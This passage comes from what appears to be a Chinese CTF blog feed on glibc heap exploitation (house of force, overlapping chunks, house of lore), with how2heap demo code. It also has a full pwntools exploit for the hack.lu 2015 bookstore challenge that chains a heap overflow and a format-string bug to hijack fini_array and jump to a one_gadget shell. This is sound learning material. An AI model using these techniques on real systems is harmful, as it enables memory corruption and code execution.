size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>|| __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>   malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x110</span>);<br><span class="hljs-comment">//victim的大小不能和buffer相同</span><br><span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">free</span>(victim);<br><br>stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br><span class="hljs-comment">//伪造size</span><br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;<br><span class="hljs-comment">//伪造victim-&gt;bk为任意合法可写地址</span><br><br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <br><span class="hljs-comment">//伪造bk指针使buffer链入unsorted bin</span><br><br><span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-comment">//申请到buffer</span><br><br><span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot;<br><span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <br><br>assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-26到2-28"><a href="#2-26到2-28" class="headerlink" title="2.26到2.28"></a>2.26到2.28</h2><p>2.26有了tcache之后申请的chunk大小要超过tcache的范围，2.28要伪造栈上fake chunk的bk和fd指针</p><h2 id="2-29以上"><a href="#2-29以上" class="headerlink" title="2.29以上"></a>2.29以上</h2><p>如果能伪造next chunk的presize和preinuse就能继续利用</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of force</title>
    <link href="/2023/02/05/house-of-force/"/>
    <url>/2023/02/05/house-of-force/</url>
    
    <content type="html"><![CDATA[<p>跳过了mmap overlapping chunks，哪天有心情详细研究下相关源码和机制再写吧（感觉也不太会用到），先搞简单的house of force</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>控制top chunk的大小为一个很大的值（-1），如果我们已知top chunk和我们需要控制的地址的插值就能直接申请chunk到那里</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-29以前"><a href="#2-29以前" class="headerlink" title="2.29以前"></a>2.29以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br><span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br><span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br><span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br><br>*(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br><span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br><span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br><span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br><br>assert(ctr_chunk == bss_var);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用步骤如下：</p><ul><li><p>修改top chunk的大小为-1</p></li><li><p>计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br></code></pre></td></tr></table></figure><p>减去4个8字节是减去了申请chunk的presize和size，以及下一个要申请的chunk的presize和size</p></li><li><p>再申请一个chunk，就能控制bss_var的值了</p></li></ul><h2 id="2-29以后"><a href="#2-29以后" class="headerlink" title="2.29以后"></a>2.29以后</h2><p>2.29增加了对top chunk的size的合法性的检查，这个方法就失效了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>overlapping chunks</title>
    <link href="/2023/02/05/overlapping-chunks/"/>
    <url>/2023/02/05/overlapping-chunks/</url>
    
    <content type="html"><![CDATA[<p>overlapping！挺简单的，例题有点离谱但也涨了不少姿势</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在2.29unsorted bin增加chunk的size检查之前，如果我们能够控制next chunk的size那就能造成堆块重叠</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="利用一"><a href="#利用一" class="headerlink" title="利用一"></a>利用一</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br><span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br>p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br>p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">free</span>(p2);<br><br><span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<br><span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<br><br>*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br>p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br><span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>示意图如下：</p><img src="/2023/02/05/overlapping-chunks/1.jpg" class title="步骤一"><p>我们就能通过p4控制p3</p><h2 id="2-27-2-28"><a href="#2-27-2-28" class="headerlink" title="2.27-2.28"></a>2.27-2.28</h2><p>有了tcache，申请的size要大于tcache的范围</p><h2 id="2-29以后"><a href="#2-29以后" class="headerlink" title="2.29以后"></a>2.29以后</h2><p>控制top chunk的preinuse位和presize这个方法依然能够使用</p><h1 id="利用二"><a href="#利用二" class="headerlink" title="利用二"></a>利用二</h1><p>实验代码如下（来自how2hwap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <br>  <span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-type">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//0x3e8</span><br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br><br>  <span class="hljs-built_in">free</span>(p4);<br><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>; <span class="hljs-comment">//&lt;--- BUG HERE </span><br><br>  <span class="hljs-built_in">free</span>(p2);<br><br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);  <br>&#125;<br></code></pre></td></tr></table></figure><p>示意图如下：</p><img src="/2023/02/05/overlapping-chunks/2.jpg" class title="步骤二"><p>触发合并能够控制更多的chunk，且所有版本都可用</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hack-lu-CTF-2015-bookstore"><a href="#hack-lu-CTF-2015-bookstore" class="headerlink" title="hack.lu CTF 2015-bookstore"></a>hack.lu CTF 2015-bookstore</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞挺多，主要利用的有两个</p><ul><li>edit函数中的数据读入没有长度限制<img src="/2023/02/05/overlapping-chunks/edit.png" class title="edit"></li><li>最后有一个格式化字符串漏洞<img src="/2023/02/05/overlapping-chunks/printf.png" class title="printf"></li></ul><p>漏洞很多的同时限制也很多，只有两个0x90的堆块可以编辑和释放，以及能申请一个0x140的堆块，但申请完之后会直接退出</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>要触发格式化字符串就要控制dest。如果我们通过edit(order2)来控制dest，edit完又会在dest处写”Your order is submitted!\n”，所以我们就要考虑用别的方法控制dest，过程如下：</p><ul><li>free(order2)</li><li>通过order1的溢出更改order2的size为0x151，这样执行submit过程时使用的chunk order3实际上是order2</li><li>之后会先把order1的内容copy到order2中，再把order2的内容（还是order1的内容）copy到order2中，所以只要order1的data足够长就能溢出到dest中，如果在order1中写入格式化字符串，就能触发格式化字符串漏洞</li></ul><p>还要解决两个问题，就是如何利用格式化字符串返回main函数，第二次执行main函数的时候如何执行one_gadget<br>第一个问题我们可以通过劫持fini_array实现（通过这道题涨的新姿势）<br>第二个问题我们可以通过泄露栈地址，格式化字符串漏洞修改返回地址为one_gadget实现（所以说这是道格式化字符串题不是道堆题(╯‵□′)╯︵┻━┻）</p><h4 id="fini-array"><a href="#fini-array" class="headerlink" title="fini_array"></a>fini_array</h4><p>先捋一遍程序的运行过程<br>众所周知，main并不是程序真正的入口，真正的入口应该是start</p><img src="/2023/02/05/overlapping-chunks/start.png" class title="start"><p>0x400780就是bookstore程序的start函数<br>gdb跟踪一下程序的过程</p><ul><li>start函数首先调用了__libc_start_main<img src="/2023/02/05/overlapping-chunks/call_libc.png" class title="call_libc"></li><li>__libc_start_main有一个call rbp的过程<br>实际调用的是0x400cb0，即init函数<img src="/2023/02/05/overlapping-chunks/call_rbp.png" class title="call_rbp"><img src="/2023/02/05/overlapping-chunks/init.png" class title="init"></li><li>init函数中有个call qword ptr [r12 + rbx*8]的过程，此时r12中存的是0x6011b0，rbx中存的是0<img src="/2023/02/05/overlapping-chunks/call_r12.png" class title="call_r12">0x6011b0实际上就是.init_array段，即调用函数sub_400850<img src="/2023/02/05/overlapping-chunks/init_array.png" class title="init_array"></li><li>__libc_start_main执行完init函数后有一个call rax，此时rax存的是0x400a39，就是执行main函数了<img src="/2023/02/05/overlapping-chunks/call_rax.png" class title="call_rax"></li><li>__libc_start_main结束main函数后调用exit<img src="/2023/02/05/overlapping-chunks/call_exit.png" class title="call_exit"></li><li>exit调用的__run_exit_handlers函数有一个call rdx的过程，rdx存的是_dl_fini函数<img src="/2023/02/05/overlapping-chunks/call_rdx.png" class title="call_rdx">但不知道为啥实际执行的是sub_0x400830（源码好复杂看不懂），就是.fini_array段的内容<img src="/2023/02/05/overlapping-chunks/fini_array.png" class title="fini_array"></li><li>之后程序就结束了<br>虽然有点云里雾里，但利用方法以及很清楚了，就是利用格式化字符串修改.fini_array段的内容为main函数的地址<br>在No RELRO的情况下.fini_array段是可写的<img src="/2023/02/05/overlapping-chunks/checksec.png" class title="checksec"><img src="/2023/02/05/overlapping-chunks/vmmap.png" class title="vmmap"></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter first order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit2</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter second order:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del1</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del2</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params">command</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;5: Submit\n&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>+command)<br><br>p=process(<span class="hljs-string">&#x27;./bookstore&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>del2()<br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;%2617c%13$hn%31$p%28$p&#x27;</span>+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">34</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x6011b8</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)[:-<span class="hljs-number">2</span>]<br>ss=p.recvuntil(<span class="hljs-string">b&#x27;Q&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>libcbase=<span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>)-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">240</span><br>stack=<span class="hljs-built_in">int</span>(ss,<span class="hljs-number">16</span>)-<span class="hljs-number">0xf50</span>+<span class="hljs-number">0xd68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>one_addr=p64(libcbase+<span class="hljs-number">0x45206</span>)<br>x=one_addr[<span class="hljs-number">2</span>]<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>payload=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%13$hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x5206</span>-x)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%14$hn&#x27;</span><br>edit1(<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x10</span>+payload.encode()+<span class="hljs-string">b&#x27;Q&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">12</span>-<span class="hljs-built_in">len</span>(payload))+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x151</span>))<br>submit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>+p64(stack+<span class="hljs-number">2</span>)+p64(stack))<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of lore</title>
    <link href="/2023/02/05/house-of-lore/"/>
    <url>/2023/02/05/house-of-lore/</url>
    
    <content type="html"><![CDATA[<p>没搜到有什么例题，先研究下再说</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>实现效果为分配chunk到栈上<br>small bin的检查不多：<br>_int_malloc从small bin中取chunk时，检查前一个chunk的连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>&#123;<br>       errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>       <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>从small bin中取chunk的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 